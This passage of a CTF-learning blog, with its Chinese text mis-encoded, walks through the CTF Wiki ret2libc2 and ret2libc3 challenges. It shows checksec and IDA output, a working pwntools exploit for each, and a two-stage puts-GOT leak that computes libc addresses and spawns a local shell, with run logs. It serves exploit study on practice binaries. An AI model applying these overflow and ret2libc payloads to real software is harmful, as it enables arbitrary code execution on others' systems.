class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br><br>gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x804a080</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br>sh.sendline(payload)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831194653.png" alt="image.png"></p><h2 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/m0_64180167/article/details/130263518?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-130263518-blog-122848031.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=3"># CTFWIKI-PWN-ret2libc</a> è®²çš„éå¸¸è¯¦ç»†</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2libc3]<span class="hljs-comment"># file ret2libc3</span><br>ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped<br>[root@ningan ret2libc3]<span class="hljs-comment">#</span><br>[root@ningan ret2libc3]<span class="hljs-comment"># checksec ret2libc3</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>[root@ningan ret2libc3]<span class="hljs-comment"># ./ret2libc3</span><br>No surprise anymore, system disappeard QQ.<br>Can you find it !?1234<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230829220442.png" alt="image.png"></p><p>åœˆä½çš„ä¸ºè‡ªå·±è¾“å…¥çš„å†…å®¹</p><h2 id="æ‰¾æ¼æ´å‡½æ•°"><a href="#æ‰¾æ¼æ´å‡½æ•°" class="headerlink" title="æ‰¾æ¼æ´å‡½æ•°"></a>æ‰¾æ¼æ´å‡½æ•°</h2><p>è¿›å…¥åˆ°idaä¸­ï¼ŒæŸ¥çœ‹mainå‡½æ•°ï¼Œå‘ç°getså‡½æ•°æœ‰æº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Can you find it !?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831103259.png" alt="image.png"></p><h2 id="æ‰¾systemå‡½æ•°-æ²¡æ‰¾è§"><a href="#æ‰¾systemå‡½æ•°-æ²¡æ‰¾è§" class="headerlink" title="æ‰¾systemå‡½æ•°-æ²¡æ‰¾è§"></a>æ‰¾systemå‡½æ•°-æ²¡æ‰¾è§</h2><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œæ²¡æœ‰systemå‡½æ•°</p><p>è¿›åˆ°pwndbgä¸­ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°æ²¡æœ‰systemå‡½æ•°<br>ï¼ˆæ­¤å¤„å¯ä»¥ä»¥putså‡½æ•°ä¸ºå¯¹æ¯”ï¼Œçœ‹åˆ°ä¸Šå›¾idaä¸­putså‡½æ•°çš„åœ°å€ä¸º0x08048460ï¼Œçœ‹åˆ°ä¸‹å›¾pwndbgä¸­putså‡½æ•°çš„åœ°å€ä¹Ÿä¸º0x08048460ï¼‰</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pwndbg&gt; <span class="hljs-keyword">info</span> <span class="hljs-keyword">function</span> puts<br>pwndbg&gt; <span class="hljs-keyword">info</span> <span class="hljs-keyword">function</span> <span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831105717.png" alt="image.png"></p><h2 id="æ‰¾-x2F-bin-x2F-shå­—ç¬¦ä¸²-æ²¡æ‰¾è§"><a href="#æ‰¾-x2F-bin-x2F-shå­—ç¬¦ä¸²-æ²¡æ‰¾è§" class="headerlink" title="æ‰¾&#x2F;bin&#x2F;shå­—ç¬¦ä¸²-æ²¡æ‰¾è§"></a>æ‰¾&#x2F;bin&#x2F;shå­—ç¬¦ä¸²-æ²¡æ‰¾è§</h2><p>idaä¸­æ‰¾ï¼š<br>idaæ“ä½œï¼šshift+F12    æ‰¾åˆ°å­—ç¬¦ä¸²<br>ä¹Ÿæ²¡æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831103643.png" alt="image.png"></p><p>ROPgadgetæ“ä½œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]<br>â””â”€<span class="hljs-comment"># ROPgadget --binary ret2libc3 --string &#x27;/bin/sh&#x27;</span><br>Strings information<br>============================================================<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]<br>â””â”€<span class="hljs-comment"># ROPgadget --binary ret2libc3 --string &#x27;sh&#x27;</span><br>Strings information<br>============================================================<br>0x08048736 : sh<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831110341.png" alt="image.png"></p><p>ä¸Šé¢çœ‹åˆ°ï¼Œæ²¡æœ‰&#x2F;bin&#x2F;shï¼Œæœ‰ä¸€ä¸ªshã€‚<br>é‚£è¿™ä¸ªshèƒ½å¦åˆ©ç”¨å‘¢ï¼Ÿ<br>çœ‹åˆ°shçš„åœ°å€ä¸ºï¼š0x0x08048736ï¼Œåˆ°idaä¸­åˆ†ææŸ¥çœ‹ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªshæŒ‡çš„æ˜¯no_shell-QQä¸­çš„shï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½åˆ©ç”¨çš„</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.rodata</span>:<span class="hljs-number">08048733</span>                               ; const char s<span class="hljs-selector-attr">[]</span><br><span class="hljs-selector-class">.rodata</span>:<span class="hljs-number">08048733</span> <span class="hljs-number">6</span>E <span class="hljs-number">6</span>F <span class="hljs-number">5</span>F <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>C <span class="hljs-number">6</span>C <span class="hljs-number">5</span>F <span class="hljs-number">51</span>+s db <span class="hljs-string">&#x27;no_shell_QQ&#x27;</span>,<span class="hljs-number">0</span>                    ; DATA XREF: secure+<span class="hljs-number">3</span>Dâ†‘o<br>.rodata:<span class="hljs-number">0804873</span>F <span class="hljs-number">00</span>                            align <span class="hljs-number">10</span>h<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831110657.png" alt="image.png"></p><h2 id="è§£é¢˜æ€è·¯-3"><a href="#è§£é¢˜æ€è·¯-3" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>é€šè¿‡æ³„éœ²libcçš„åœ°å€ï¼Œæ¥è®¡ç®—systemçš„åœ°å€å’Œ&#x2F;bin&#x2F;shçš„åœ°å€</p><p>å¦‚ä½•å¾—åˆ° libc ä¸­çš„æŸä¸ªå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿæˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚<strong>å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚</strong>å·²ç»æ‰§è¡Œè¿‡çš„è¯å°±ä¼šåœ¨gotè¡¨ç”Ÿå­˜ä¸‹æ¥ï¼Œæœ‰äº†çœŸå®çš„åœ°å€ï¼</p><p>(è§£æ³•1) å¯ä»¥æ³„éœ²putså‡½æ•°ï¼Œputså‡½æ•°å·²ç»æ‰§è¡Œè¿‡äº†ã€‚åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>æ³„éœ²putså‡½æ•°åœ°å€</li><li>è·å– libc ç‰ˆæœ¬</li><li>è·å– system åœ°å€ä¸ &#x2F;bin&#x2F;sh çš„åœ°å€</li><li>å†æ¬¡æ‰§è¡Œæºç¨‹åº</li><li>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜&#x2F;bin&#x2F;shâ€™)</li></ul><h2 id="expï¼šæ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€"><a href="#expï¼šæ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€" class="headerlink" title="expï¼šæ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€"></a>expï¼šæ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å¯¼å…¥ pwntools åº“ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„å¼ºå¤§å·¥å…·åº“ã€‚</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># å¯¼å…¥ LibcSearcherï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºä»å‡½æ•°åœ°å€ä¸­æœç´¢libcç‰ˆæœ¬å’Œæå–libcå‡½æ•°åœ°å€çš„å·¥å…·ã€‚</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œæ‰§è¡Œåä¸º ret2libc3 çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™å°†ç”¨äºåœ¨æœ¬åœ°ç³»ç»Ÿä¸Šæ‰§è¡Œæ¼æ´åˆ©ç”¨ã€‚</span><br>io = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><span class="hljs-comment"># å°† ret2libc3 å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ° elf å¯¹è±¡ä¸­ï¼Œä»¥ä¾¿ä»ä¸­è·å–æœ‰å…³ç¨‹åºç»“æ„çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å‡½æ•°åœ°å€å’ŒGOTåœ°å€ã€‚</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== é€šè¿‡æ³„éœ² puts å‡½æ•°çš„åœ°å€ ===&quot;</span>)<br><span class="hljs-comment"># è·å– puts å‡½æ•°çš„ PLTï¼ˆProcedure Linkage Tableï¼‰åœ°å€å’Œ GOTï¼ˆGlobal Offset Tableï¼‰åœ°å€ã€‚</span><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-comment"># è·å–ç¨‹åºçš„ _start ç¬¦å·çš„åœ°å€ï¼Œè¿™é€šå¸¸æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span><br>start_addr=elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_plt: &quot;</span>, puts_plt)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_plt): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_plt))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got: &quot;</span>, puts_got)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_got): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start_addr: &quot;</span>, start_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(start_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(start_addr))<br><span class="hljs-comment"># æ„å»ºä¸€ä¸ª payloadï¼Œå…¶ä¸­åŒ…æ‹¬ 112 ä¸ªå­—èŠ‚çš„å¡«å……ï¼ˆç”¨äºå¡«å……åˆ°è¿”å›åœ°å€ä¹‹å‰ï¼‰ï¼Œç„¶åæ˜¯ puts å‡½æ•°çš„ PLT åœ°å€ã€ç¨‹åºå…¥å£ç‚¹åœ°å€å’Œ puts å‡½æ•°çš„ GOT åœ°å€ã€‚è¿™å°†åœ¨ç¨‹åºä¸­è§¦å‘æ¼æ´ã€‚</span><br>payload1 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,puts_plt,start_addr,puts_got])<br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + puts_plt + start + puts_got  # æŠ¥é”™ï¼šTypeError: can&#x27;t concat int to bytes</span><br><span class="hljs-comment"># payload1 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(puts_plt) + p32(start) + p32(puts_got) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload1: &quot;</span>, payload1)<br><span class="hljs-comment"># å‘é€æ„å»ºå¥½çš„ payload1 åˆ°ç¨‹åºã€‚</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload1)<br><span class="hljs-comment"># æ¥æ”¶ä»ç¨‹åºä¸­æ³„éœ²çš„ puts å‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ã€‚è¿™å°†å¸®åŠ©ç¡®å®šlibcçš„åŸºå€ã€‚</span><br><span class="hljs-comment"># io.recv(4)æ¥å—ç¨‹åºè¿”å›çš„äºŒè¿›åˆ¶ å¤§å°ä¸º4å­—èŠ‚  u32()ä¸ºä¿å­˜ä¸ºæ— ç¬¦å·çš„32ä½</span><br>puts_addr_raw = io.recv(<span class="hljs-number">4</span>)<br>puts_addr = u32(puts_addr_raw) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr_raw: &quot;</span>, puts_addr_raw)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr: &quot;</span>, puts_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(puts_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== è®¡ç®—libcçš„åŸºå€ï¼Œç„¶åè·å– system å‡½æ•°åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸²åœ°å€ ===&quot;</span>)<br><span class="hljs-comment"># ä½¿ç”¨ LibcSearcher å·¥å…·ï¼Œæ ¹æ®æ³„éœ²çš„ puts å‡½æ•°åœ°å€æ¥æœç´¢libcåº“å¹¶æå–ç›¸å…³ä¿¡æ¯ã€‚</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><span class="hljs-comment"># è®¡ç®—libcçš„åŸºå€ï¼Œè¿™æ˜¯é€šè¿‡ä» puts å‡½æ•°åœ°å€ä¸­å‡å» puts åœ¨libcä¸­çš„åç§»å¾—åˆ°çš„ã€‚</span><br>base = puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment"># è®¡ç®— system å‡½æ•°å’Œ /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ï¼Œè¿™å°†ç”¨äºåç»­çš„æ¼æ´åˆ©ç”¨ã€‚</span><br>system_addr = base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_addr=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># æ„å»ºç¬¬äºŒä¸ª payloadï¼Œå…¶ä¸­åŒ…æ‹¬ 112 ä¸ªå­—èŠ‚çš„å¡«å……ï¼Œç„¶åæ˜¯è®¡ç®—å¾—åˆ°çš„ system å‡½æ•°åœ°å€ã€éšæ„çš„è¿”å›åœ°å€ï¼ˆ1234ï¼‰ï¼Œä»¥åŠè®¡ç®—å¾—åˆ°çš„ /bin/sh å­—ç¬¦ä¸²åœ°å€ã€‚</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(base): &quot;</span>, <span class="hljs-built_in">hex</span>(base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(system_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(bin_addr): &quot;</span>, <span class="hljs-built_in">hex</span>(bin_addr))<br>payload2 = flat([<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span>,system_addr,<span class="hljs-number">1234</span>,bin_addr])<br><span class="hljs-comment"># ä½¿ç”¨p32å‡½æ•°å°†æ•´æ•°è½¬æ¢ä¸ºå¯¹åº”çš„4å­—èŠ‚äºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;0xdeadbeaf&#x27; + p32(sh_addr) # é”™è¯¯å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + p32(0xdeadbeaf) + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;\x0f\x0b\x0f\x0b&#x27; + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-comment"># payload2 = b&#x27;A&#x27;*108 + b&#x27;BBBB&#x27; + p32(system_addr) + b&#x27;1234&#x27; + p32(sh_addr) # æ­£ç¡®å†™æ³•</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload2: &quot;</span>, payload2)<br><span class="hljs-comment"># å‘é€æ„å»ºå¥½çš„ payload2 åˆ°ç¨‹åºï¼Œè§¦å‘ç¬¬äºŒé˜¶æ®µçš„æ¼æ´åˆ©ç”¨ï¼Œæ—¨åœ¨è·å–ç³»ç»Ÿ Shellã€‚</span><br>io.sendlineafter(<span class="hljs-string">&#x27;!?&#x27;</span>,payload2)<br><span class="hljs-comment"># ä¸ç¨‹åºè¿›è¡Œäº¤äº’ï¼Œè·å–ç³»ç»Ÿ Shellï¼Œè¿›å…¥äº¤äº’å¼å‘½ä»¤æ¨¡å¼ã€‚</span><br>io.interactive()<br><br>                                                                                                                                                                       <span class="hljs-string">&quot;&quot;&quot;                                                            </span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctfwiki/ret2libc3]</span><br><span class="hljs-string">â””â”€# python exp.py      </span><br><span class="hljs-string">[+] Starting local process &#x27;./ret2libc3&#x27;: pid 18449</span><br><span class="hljs-string">[*] &#x27;/root/ctfwiki/ret2libc3/ret2libc3&#x27;</span><br><span class="hljs-string">    Arch:     i386-32-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x8048000)</span><br><span class="hljs-string">=== é€šè¿‡æ³„éœ² puts å‡½æ•°çš„åœ°å€ ===</span><br><span class="hljs-string">puts_plt:  134513760</span><br><span class="hljs-string">hex(puts_plt):  0x8048460</span><br><span class="hljs-string">puts_got:  134520856</span><br><span class="hljs-string">hex(puts_got):  0x804a018</span><br><span class="hljs-string">start_addr:  134513872</span><br><span class="hljs-string">hex(start_addr):  0x80484d0</span><br><span class="hljs-string">payload1:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\x84\x04\x08\xd0\x84\x04\x08\x18\xa0\x04\x08&#x27;</span><br><span class="hljs-string">/usr/local/lib/python3.11/dist-packages/pwnlib/tubes/tube.py:840: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="hljs-string">puts_addr_raw:  b&#x27; 2\xc7\xf7&#x27;</span><br><span class="hljs-string">puts_addr:  4157026848</span><br><span class="hljs-string">hex(puts_addr):  0xf7c73220</span><br><span class="hljs-string">=== è®¡ç®—libcçš„åŸºå€ï¼Œç„¶åè·å– system å‡½æ•°åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸²åœ°å€ ===</span><br><span class="hljs-string">[+] There are multiple libc that meet current constraints :</span><br><span class="hljs-string">0 - libc6_2.37-5_i386</span><br><span class="hljs-string">1 - libc6_2.32-0experimental0_amd64</span><br><span class="hljs-string">2 - libc6_2.37-6_i386</span><br><span class="hljs-string">3 - libc6-amd64_2.32-0experimental0_i386</span><br><span class="hljs-string">4 - libc6-amd64_2.8~20080505-0ubuntu9_i386</span><br><span class="hljs-string">5 - libc6_2.32-0experimental1_amd64</span><br><span class="hljs-string">6 - libc6-amd64_2.32-0experimental1_i386</span><br><span class="hljs-string">7 - libc6_2.8~20080505-0ubuntu9_amd64</span><br><span class="hljs-string">8 - libc6_2.37-7_i386</span><br><span class="hljs-string">[+] Choose one : 0</span><br><span class="hljs-string">hex(base):  0xf7c00000</span><br><span class="hljs-string">hex(system_addr):  0xf7c4c8a0</span><br><span class="hljs-string">hex(bin_addr):  0xf7db5fc8</span><br><span class="hljs-string">payload2:  b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xc8\xc4\xf7\xd2\x04\x00\x00\xc8_\xdb\xf7&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">core  exp2.py  exp-clean.py  exp.py  ret2libc3</span><br><span class="hljs-string">$  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831104244.png" alt="image.png"></p><h3 id="libc-database"><a href="#libc-database" class="headerlink" title="libc-database"></a>libc-database</h3><p><a href="https://libc.rip/">https://libc.rip/</a></p><p>ä»ä¸Šé¢çš„è¿è¡Œç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œputså‡½æ•°çš„çœŸå®åœ°å€ä¸ºï¼š0xf7c73220<br>æœ«å°¾220ä¸º12ä½ï¼Œè¾“å…¥å·¥å…·ä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°å³è¾¹çš„ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬ä¸Šé¢è¾“å…¥çš„0æ‰€å¯¹åº”çš„<a href="https://libc.rip/#">libc6_2.37-5_i386</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230831112025.png" alt="image.png"></p><h2 id="exp-clean-exp-åˆ æ‰äº†æ³¨é‡Š"><a href="#exp-clean-exp-åˆ æ‰äº†æ³¨é‡Š" class="headerlink" title="exp-clean   exp åˆ æ‰äº†æ³¨é‡Š"></a>exp-clean   exp åˆ 